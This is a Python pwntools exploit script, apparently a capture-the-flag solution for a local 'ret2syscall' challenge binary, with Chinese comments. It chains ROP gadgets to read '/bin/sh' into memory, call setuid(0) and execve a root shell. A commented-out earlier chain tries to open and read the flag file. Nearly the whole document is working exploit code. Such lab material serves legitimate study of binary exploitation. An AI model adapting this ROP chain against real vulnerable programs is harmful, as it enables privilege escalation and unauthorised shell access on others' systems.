from pwn import *
# set 
context(arch="amd64", os="linux", log_level="debug")
# excute
challenge_path = "/challenge/ret2syscall_1"
elf = ELF(challenge_path)
p = process(challenge_path)
# 程序中寻找指令的地址
# ROPgadget --binary /challenge/ret2syscall_1 --only "pop|ret" | grep "rdi"
# ROPgadget --binary /challenge/ret2syscall_1 --ropchain
syscall_ret=0x401182
pop_rax_ret=0x401180
pop_rdx_ret=0x40117e
pop_rdi_ret=0x4012b3
pop_rsi_popr15_ret=0x4012b1
flag=0x402008
bss_addr=0x404070
main_addr=0x4011ED
mov_rdi_rax_poprbp_ret=0x4011E2

#填充+rbp
payload=3*p64(0x1111111111111111)
#read输入/bin/sh到数据段
payload+=p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_popr15_ret)+p64(bss_addr)+p64(bss_addr)+p64(pop_rdx_ret)+p64(0x9)
payload+=p64(pop_rax_ret)+p64(0)+p64(syscall_ret)
#setuid(0)!!!!!!!!!!!!!!坑点，平台一定要setuid为0才能获得root权限，否则之后的execve子进程也只是hacker权限
payload+=p64(pop_rdi_ret) + p64(0)
payload+=p64(pop_rax_ret)+p64(105)+p64(syscall_ret)
#execve(/bin/sh,0,0)
payload+=p64(pop_rdi_ret) + p64(bss_addr) + p64(pop_rsi_popr15_ret)+p64(0)+p64(0)+p64(pop_rdx_ret)+p64(0)
payload+=p64(pop_rax_ret)+p64(0x3b)+p64(syscall_ret)

p.sendafter("Give me your input\n",payload)
sleep(0.5)
p.send("/bin/sh\x00")
p.interactive()
# python3 /home/hacker/rop2.py
# linux64系统调用号https://blog.csdn.net/qq_41202237/article/details/107250349
"""
原本的思路，openflag，再read写入数据段，再write到标准输出，问题是open返回的文件标识rax无法传递给rdi
#填充+rbp
payload=3*p64(0x1111111111111111)
#调用open打开flag,open(flagaddr,0,0),参数rdi rsi rdx，调用号2，返回flag文件指针到rax中
payload+=p64(pop_rdi_ret)+p64(flag)+p64(pop_rsi_popr15_ret)+p64(0)+p64(0)+p64(pop_rdx_ret)+p64(0)
payload+=p64(pop_rax_ret)+p64(2)+p64(syscall_ret)
#read将flag写入数据段,read(fd,&buf,count),猜文件描述符
payload+=p64(mov_rdi_rax_poprbp_ret) + p64(1) + p64(pop_rsi_popr15_ret)+p64(bss_addr)+p64(bss_addr)+p64(pop_rdx_ret)+p64(0x80)
payload+=p64(pop_rax_ret)+p64(0)+p64(syscall_ret)
#返回main输出flag
payload+=p64(main_addr)
"""